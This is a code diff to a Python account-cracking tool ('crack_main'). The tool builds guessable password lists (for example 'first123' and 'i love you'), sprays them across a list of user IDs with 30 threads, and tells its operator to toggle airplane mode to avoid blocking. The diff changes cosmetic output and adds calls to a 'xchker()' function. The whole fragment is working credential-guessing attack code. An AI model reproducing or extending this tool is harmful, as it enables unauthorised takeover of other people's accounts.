@@ -531,10 +531,10 @@ class crack_main():
                         density_=input(" density : ")
                         info_file = open("device_info.txt","a").write(version_+'$'+model_+'$'+brand_name_+'$'+width_+'$'+build_+'$'+operator_+'$'+density_)
                 os.system('clear')
-                print(logo)
+                print(logo);xchker()
                 print(' How many password do you want try?')
-                print(50*"=")
-                pl = input(' How Much Password Do You Want To Add : ')
+                print(50*"-")
+                pl = input(' How Much Password Do You Want To Add ? ')
                 if pl in ['auto','Auto','AUTO','auto or Auto']:
                         passlist.append('first123')
                         passlist.append('first12345')
@@ -550,15 +550,15 @@ class crack_main():
                         passlist.append('i love you')
                 else:
                         print(' Example first123,last123,khan123,firstlast')
-                        print(50*"=")
+                        print(50*"-")
                         for cd in range(int(pl)):
                                 passlist.append(input(f' ({cd+1}) Password : '))
                 os.system('clear')
-                print(logo)
+                print(logo);xchker()
                 print(' Total Ids : '+str(len(self.id)))
                 print(' Cloning Is Started Wait For Results')
                 print(' After Every 5 Min Turn Airplane On/Off')
-                print(50*'=')
+                print(50*'-')
                 with ThreadPool(max_workers=30) as formSubmit:
                         for user in self.id:
                                 iid,name = user.split('|')
